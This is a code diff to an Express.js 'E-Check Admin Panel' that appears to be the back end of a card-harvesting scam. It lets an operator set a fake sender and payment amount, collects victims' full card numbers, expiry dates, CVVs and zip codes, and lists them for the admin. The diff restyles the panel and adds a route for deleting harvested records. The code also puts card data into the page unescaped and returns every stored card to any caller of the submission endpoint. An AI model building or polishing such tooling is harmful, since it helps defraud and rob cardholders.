@@ -28,9 +28,9 @@ app.get('/', (req, res) => {
                 <title>E-Check Admin Login</title>
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
-            <body class="bg-gray-100 min-h-screen flex items-center justify-center">
-                <div class="w-full max-w-sm bg-white rounded-2xl shadow-lg p-6">
-                    <h1 className="text-2xl font-bold text-blue-600 text-center mb-6">Admin Login</h1>
+            <body class="bg-gradient-to-br from-blue-100 to-blue-300 min-h-screen flex items-center justify-center">
+                <div class="w-full max-w-sm bg-white rounded-2xl shadow-2xl p-8 transform transition-all hover:scale-105">
+                    <h1 class="text-3xl font-bold text-blue-600 text-center mb-6">Admin Login</h1>
                     <div class="space-y-4">
                         <div>
                             <label class="block text-blue-600 text-sm font-medium mb-1">Password</label>
@@ -38,12 +38,12 @@ app.get('/', (req, res) => {
                                 id="passwordInput"
                                 type="password"
                                 placeholder="Enter password"
-                                class="w-full p-2 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                                class="w-full p-3 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-shadow shadow-sm hover:shadow-md"
                             />
                         </div>
                         <button
                             onclick="login()"
-                            class="w-full bg-blue-600 text-white p-2 rounded-lg font-medium hover:bg-blue-700 transition-all"
+                            class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700 transform hover:scale-105 transition-all shadow-md hover:shadow-lg"
                         >
                             Login
                         </button>
@@ -70,13 +70,13 @@ app.get('/', (req, res) => {
             <title>E-Check Admin Panel</title>
             <script src="https://cdn.tailwindcss.com"></script>
         </head>
-        <body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center">
-            <div class="w-full max-w-2xl bg-white rounded-2xl shadow-lg p-6">
-                <h1 class="text-3xl font-bold text-blue-600 text-center mb-6">E-Check Admin Panel</h1>
+        <body class="bg-gradient-to-br from-blue-100 to-blue-300 min-h-screen flex flex-col items-center justify-center p-4">
+            <div class="w-full max-w-3xl bg-white rounded-3xl shadow-2xl p-8 transform transition-all hover:shadow-3xl">
+                <h1 class="text-4xl font-extrabold text-blue-600 text-center mb-8">E-Check Admin Panel</h1>
                 
                 <!-- Update Sender and Amount Form -->
-                <div class="mb-8">
-                    <h2 class="text-xl font-semibold text-blue-600 mb-4">Update Payment Details</h2>
+                <div class="mb-10 bg-blue-50 rounded-2xl p-6 shadow-inner">
+                    <h2 class="text-2xl font-semibold text-blue-600 mb-4">Update Payment Details</h2>
                     <div class="space-y-4">
                         <div>
                             <label class="block text-blue-600 text-sm font-medium mb-1">Sender Name</label>
@@ -85,7 +85,7 @@ app.get('/', (req, res) => {
                                 type="text"
                                 placeholder="Enter sender name"
                                 value="${paymentData.sender}"
-                                class="w-full p-2 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                                class="w-full p-3 rounded-lg border border-blue-200 bg-white focus:outline-none focus:ring-2 focus:ring-blue-400 transition-shadow shadow-sm hover:shadow-md"
                             />
                         </div>
                         <div>
@@ -95,12 +95,12 @@ app.get('/', (req, res) => {
                                 type="number"
                                 placeholder="Enter amount"
                                 value="${paymentData.amount}"
-                                class="w-full p-2 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                                class="w-full p-3 rounded-lg border border-blue-200 bg-white focus:outline-none focus:ring-2 focus:ring-blue-400 transition-shadow shadow-sm hover:shadow-md"
                             />
                         </div>
                         <button
                             onclick="updatePayment()"
-                            class="w-full bg-blue-600 text-white p-2 rounded-lg font-medium hover:bg-blue-700 transition-all"
+                            class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700 transform hover:scale-105 transition-all shadow-md hover:shadow-lg"
                         >
                             Update
                         </button>
@@ -109,17 +109,25 @@ app.get('/', (req, res) => {
                 
                 <!-- Card Details Records -->
                 <div>
-                    <h2 class="text-xl font-semibold text-blue-600 mb-4">Card Details Records</h2>
+                    <h2 class="text-2xl font-semibold text-blue-600 mb-4">Card Details Records</h2>
                     <div id="records" class="space-y-4">
-                        ${paymentData.cardDetails.length > 0 ? paymentData.cardDetails.map(detail => `
-                            <div class="border border-blue-200 rounded-lg p-4">
-                                <p><strong>Name:</strong> ${detail.name}</p>
-                                <p><strong>Card Number:</strong> ${detail.cardNumber}</p>
-                                <p><strong>Expiry:</strong> ${detail.expiry}</p>
-                                <p><strong>CVV:</strong> ${detail.cvv}</p>
-                                <p><strong>Zip Code:</strong> ${detail.zipCode}</p>
+                        ${paymentData.cardDetails.length > 0 ? paymentData.cardDetails.map((detail, index) => `
+                            <div class="border border-blue-200 rounded-xl p-4 bg-blue-50 shadow-md hover:shadow-lg transition-all flex justify-between items-center">
+                                <div>
+                                    <p><strong>Name:</strong> ${detail.name}</p>
+                                    <p><strong>Card Number:</strong> ${detail.cardNumber}</p>
+                                    <p><strong>Expiry:</strong> ${detail.expiry}</p>
+                                    <p><strong>CVV:</strong> ${detail.cvv}</p>
+                                    <p><strong>Zip Code:</strong> ${detail.zipCode}</p>
+                                </div>
+                                <button
+                                    onclick="deleteRecord(${index})"
+                                    class="bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600 transition-all shadow-sm hover:shadow-md"
+                                >
+                                    Delete
+                                </button>
                             </div>
-                        `).join('') : '<p class="text-blue-600">No card details submitted yet.</p>'}
+                        `).join('') : '<p class="text-blue-600 text-center">No card details submitted yet.</p>'}
                     </div>
                 </div>
             </div>
@@ -135,9 +143,24 @@ app.get('/', (req, res) => {
                         });
                         const result = await response.json();
                         alert(result.message);
-                        window.location.reload(); // Refresh to show updated data
+                        window.location.reload();
                     } catch (error) {
                         alert('Error updating payment details');
+                    }
+                }
+
+                async function deleteRecord(index) {
+                    if (confirm('Are you sure you want to delete this record?')) {
+                        try {
+                            const response = await fetch('/api/card-details/' + index, {
+                                method: 'DELETE'
+                            });
+                            const result = await response.json();
+                            alert(result.message);
+                            window.location.reload();
+                        } catch (error) {
+                            alert('Error deleting record');
+                        }
                     }
                 }
             </script>
@@ -161,6 +184,16 @@ app.post('/api/card-details', (req, res) => {
     const { name, cardNumber, expiry, cvv, zipCode } = req.body;
     paymentData.cardDetails.push({ name, cardNumber, expiry, cvv, zipCode });
     res.json({ message: 'Card details received', data: paymentData });
+});
+
+app.delete('/api/card-details/:index', (req, res) => {
+    const index = parseInt(req.params.index);
+    if (index >= 0 && index < paymentData.cardDetails.length) {
+        paymentData.cardDetails.splice(index, 1);
+        res.json({ message: 'Record deleted', data: paymentData });
+    } else {
+        res.status(404).json({ message: 'Record not found' });
+    }
 });
 
 app.listen(port, () => {
